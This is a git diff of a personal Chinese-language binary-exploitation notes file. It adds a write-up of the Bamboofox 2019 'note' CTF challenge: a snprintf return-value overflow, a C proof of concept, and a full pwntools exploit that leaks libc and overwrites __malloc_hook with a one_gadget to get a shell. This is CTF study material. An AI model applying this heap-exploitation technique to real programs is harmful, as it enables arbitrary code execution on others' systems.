@@ -343,7 +343,7 @@ python version :
 
 
 ---
----
+
 ## heap:
 ---
 ### unlink:
@@ -400,8 +400,9 @@ python version :
         * 把0x602148那邊先改free_got,puts_got,atoi_got(payload2)
         * leak只要把free_got改成puts_plt就可以用puts(puts_got)來leak
         * 算出libc_base後把atoi_got改system之後input /bin/sh就拿shell了
+---
 
-### Hitcon_stkof exp:
+Hitcon_stkof exp:
 
 ```python
 #!/usr/bin/env python2
@@ -534,5 +535,142 @@ cpio解壓縮打包
     | cpio --null -ov --format=newc \
     | gzip -9 > $1
     ```
+    
+    
+    
+## Binary write up:
+
+### Bamboofox 2019 note:
+* Heap exploitation 的相關題目,在剛學heap exp的時候來解發現完全不會且漏洞的地方都沒找到。
+在只學了fastbin corruption 的attack是完全不夠解的且在glibc-2.26之後有tcache的機制所以又稍微不太一樣了。
+* 漏洞：
+    * 這題的漏洞是在比賽結束後看writeup看了好一陣子才理解的漏洞。成因在snprintf()這個function也就是位於menu()的copy()。
+    * snprintf 的 return value 是print的大小而不是寫入字串的大小,  由整個函數來看： int snprintf(char *str, size_t size, const char * restrict format, ...) 可以限制函數的size來阻擋在stack 或heap overflow的問題但是如果拿ret value 來當作大小的話則會存在overflow !。
+        * Poc: 
+             ```C
+             #include <stdio.h>
+            #include <stdlib.h>
+
+            int main(){
+            char str1[10];
+            int ret_val ;
+            ret_val = snprintf(str1,9,"AAAABBBBCCCC");
+            printf("ret_val => %d\n",ret_val);
+            return 0 ;
+            }
+            
+            ./poc 
+            ret_val => 12
+ 
+           ```
+   ---
+   
+* 本題分析：
+``` 
+    透過ida的Pseudocode可以看到 
+    *((char**)&note+3*v4) : des idx 
+    *((_QWORD*)&unk_202068+3*v4) : (des) size
+    *((_QWORD*)&note+3*v3) : source idx
+    
+    如果大小source idx 裡面字串長度大於des idx 的size
+    的時候return value 會是source idx 裡面的字串長度,
+    所以只要先edit 一段夠長的string到source idx 裡面,
+    透過copy()就可以把size改掉並造成overflow。
+``` 
+![](https://i.imgur.com/LO6OPTr.png)
+
+* 利用：
+    * 參考官方解法：
+        * 因為有tcache所以先for迴圈把tcahe灌滿7個之後才能用到fastbin 
+        * 透過copy()函數去leak libc 
+        * 去改__malloc_hook -> one_gadget
+        * get shell 
+---
+Exp: 
+```python
+from pwn import *
+import sys
+if len(sys.argv) >1:
+    r = remote(sys.argv[1], int(sys.argv[2]))
+else:
+    r = process('./note')
+
+def create(size):
+    r.sendlineafter(':', '1')
+    r.sendlineafter(':', str(size))
+
+def edit(idx, ctx):
+    r.sendlineafter(':', '2')
+    r.sendlineafter(':', str(idx))
+    r.sendafter(':', ctx)
+
+def show(idx):
+    r.sendlineafter(':', '3')
+    r.sendlineafter(':', str(idx))
+
+def copy(src,dst):
+    r.sendlineafter(':', '4')
+    r.sendlineafter(':', str(src))
+    r.sendlineafter(':', str(dst))
+
+def delete(idx):
+    r.sendlineafter(':', '5')
+    r.sendlineafter(':', str(idx))
+
+#fill tcache
+for i in range(7):
+    create(0x60)
+    delete(0)
+#fill tcahce 
+for i in range(7):
+    create(0x400)
+    delete(0)
+
+create(0x80) #0
+create(0x400)#1
+create(0x80) #2
+create(0x400)#3
+create(0x80) #4
+create(0x60) #5
+create(0x60) #6
+create(0x80) #7
+delete(1)
+
+#preset copy
+edit(3, 'A'*0x100 + '\n')
+#use copy to get 0x101 ret
+copy(3, 0)
+#leak
+show(0)
+
+r.recvn(0x91)
+libc = u64(r.recvn(8)) - 0x3ebca0
+print('libc', hex(libc))
+#fastbin
+delete(6)
+delete(5)
+
+copy(3, 4)
+#find near malloc_hook place for size 0x70
+edit(3, 'A'*0x90 + p64(libc+0x3ebc30-0x28+5))
+copy(3, 4)
+
+#set the fake chunk size 
+for i in range(6,-1, -1):
+    edit(3, 'A'*(0x88+i) + p64(0x71) )
+    copy(3, 4)
+#get fastbin 
+create(0x60)
+create(0x60)
+
+one_gadget = libc+0x4f322
+#write one_gadget 
+edit(5, 'A'*0x13 + p64(one_gadget))
+delete(0)
+create(0)
+
+r.interactive()
+
+```
     
 
